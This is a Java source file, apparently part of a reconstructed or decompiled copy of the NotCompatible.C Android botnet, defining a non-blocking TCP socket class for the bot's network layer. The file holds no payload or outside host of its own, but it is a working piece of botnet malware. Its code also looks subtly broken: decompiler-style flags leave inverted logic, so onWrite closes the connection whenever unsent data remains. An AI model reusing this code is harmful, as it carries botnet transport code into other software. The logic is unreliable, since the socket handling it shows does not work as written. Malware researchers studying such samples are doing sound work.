package diff.notcompatible.c.bot.net.tcp;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.SocketChannel;

import diff.notcompatible.c.bot.net.CustomSocket;
import diff.notcompatible.c.bot.objects.MyBuffer;

public class TCPSocket extends CustomSocket {
    public boolean sendAndClose;
    public SocketChannel channel;
    public MyBuffer readBuffer;
    public SelectionKey selfKey;
    public ByteBuffer tmpBuffer;
    public MyBuffer writeBuffer;

    public TCPSocket() {
        sendAndClose = false;
        readBuffer = new MyBuffer();
        writeBuffer = new MyBuffer();
        tmpBuffer = ByteBuffer.allocate(0x2000);
    }

    private void writeBuff(byte[] src) {
        writeBuffer.put(src);
        selfKey.interestOps(selfKey.interestOps() | 4);
    }

    public void send(MyBuffer src) throws IOException {
        writeBuff(src.array());
    }

    public void send(ByteBuffer src) throws IOException {
        writeBuff(src.array());
    }

    public void send(byte[] src) throws IOException {
        writeBuff(src);
    }

    public void onClose(SelectionKey key) throws IOException {
        super.onClose(key);
    }

    public void onConnect(SelectionKey key) throws IOException {
        super.onConnect(key);
        boolean r1i = true;
        boolean r0i = writeBuffer.size != 0;
        if ((key.interestOps() & 4) != 4) {
            if (r0i & r1i) {
                key.interestOps(key.interestOps() ^ 4);
            }
        } else {
            r1i = false;
            if (r0i & r1i) {
            } else {
                key.interestOps(key.interestOps() ^ 4);
            }
        }
    }

    public void onNoConnect(SelectionKey key) throws IOException {
        super.onNoConnect(key);
    }

    public void onRead(SelectionKey key) throws IOException {
        super.onRead(key);

        try {
            if (channel.isConnected()) {
                tmpBuffer.position(0);
                if(channel.read(tmpBuffer) != -1) {
                	readBuffer.put(tmpBuffer.array(), tmpBuffer.position());
                	return;
                 }
             }
            
            // Either not connected or read failed
            channel.close();
            onNoConnect(key);
            key.cancel();
        } catch (IOException e) {
            channel.close();
            key.cancel();
            onClose(key);
        }
    }

    public void onWrite(SelectionKey key) throws IOException {
        super.onWrite(key);
        boolean r2i = true;
        writeBuffer.buffer.position(0);
        writeBuffer.shift(channel.write(writeBuffer.buffer));
        if (writeBuffer.size == 0 && (key.interestOps() & 4) == 4) {
            key.interestOps(key.interestOps() ^ 4);
        }
        if (writeBuffer.size == 0) {
            if (sendAndClose & r2i) {
                channel.close();
                onClose(selfKey);
            }
        } else {
            r2i = false;
            if (sendAndClose & r2i) {
            } else {
                channel.close();
                onClose(selfKey);
            }
        }
    }
}
